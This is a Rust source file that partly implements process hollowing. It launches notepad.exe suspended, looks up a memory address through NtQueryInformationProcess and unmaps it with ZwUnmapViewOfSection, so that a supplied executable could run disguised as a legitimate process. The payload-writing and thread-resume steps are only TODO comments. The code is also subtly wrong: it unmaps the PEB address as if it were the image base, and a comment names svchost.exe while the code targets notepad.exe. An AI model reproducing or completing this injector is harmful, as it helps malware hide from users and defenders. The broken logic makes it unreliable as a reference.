use std::ptr;

use ntapi::{ntpsapi::{NtQueryInformationProcess, ProcessBasicInformation, PROCESS_BASIC_INFORMATION}, ntzwapi::ZwUnmapViewOfSection};
use winapi::{
    shared::{
        minwindef::FALSE,
        ntdef::HANDLE,
        ntstatus::STATUS_ACCESS_DENIED,
    },
    um::{
        handleapi::CloseHandle, processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA}, winbase::CREATE_SUSPENDED, winnt::{
            PROCESS_QUERY_INFORMATION, PVOID,
        }
    },
};

/// Create a suspended process that will be used to run the PE
unsafe fn create_process() -> Result<PROCESS_INFORMATION, String> {
    let app_name = std::ffi::CString::new("C:\\Windows\\System32\\notepad.exe").unwrap();

    let mut startup_info: STARTUPINFOA = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

    if CreateProcessA(
        app_name.as_ptr(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        FALSE,
          CREATE_SUSPENDED | PROCESS_QUERY_INFORMATION,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut startup_info,
        &mut process_info,
    ) == 0
    {
        return Err(format!(
            "CreateProcessA failed: {}",
            std::io::Error::last_os_error()
        ));
    };

    Ok(process_info)
}

/// Get image base address that will be used to hollow the process
pub unsafe fn get_process_image_base(process_handle: HANDLE) -> Option<usize> {
    let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();

    let status = NtQueryInformationProcess(
        process_handle,
        ProcessBasicInformation,
        &mut pbi as *mut _ as PVOID,
        std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
        ptr::null_mut(),
    );

    if status == 0 { 
        return Some(pbi.PebBaseAddress as usize)
    }

    return None;
}

// unsafe fn resume_thread(thread_handle: HANDLE) -> Result<(), String> {
//     if ResumeThread(thread_handle) == u32::MAX {
//         return Err(format!(
//             "Failed to resume thread, error code: {}",
//             GetLastError()
//         ));
//     }

//     Ok(())
// }

unsafe fn hollow_process_memory(process_handle: HANDLE, base_addr: PVOID) -> Result<(), String> {
    if ZwUnmapViewOfSection(process_handle, base_addr) == STATUS_ACCESS_DENIED {
        return Err("Failed to hollow previous process memory".to_string());
    };

    Ok(())
}

/// Execute process hollowing for our PE on svchost.exe process
pub unsafe fn execute_on_remote_thread(_pe_data: &[u8]) -> Result<(), &str> {
    let created_process = create_process().expect("Failed to create process for PE");

    let image_base_addr = get_process_image_base(created_process.hProcess).unwrap();

    hollow_process_memory(created_process.hProcess, image_base_addr as PVOID).unwrap();

    // TODO:
    // 1. Get base address of the previous process
    // 2. Extract header information from PE
    // 3. Remove that entry point (base addr)
    // 4. Replace the process with our executable
    // 5. Set the entry point correctly for new executable
    // 6. Resume the thread

    // TODO: Only resume after everything is done
    // resume_thread(created_process.hThread).unwrap();

    CloseHandle(created_process.hProcess);
    CloseHandle(created_process.hThread);

    Ok(())
}
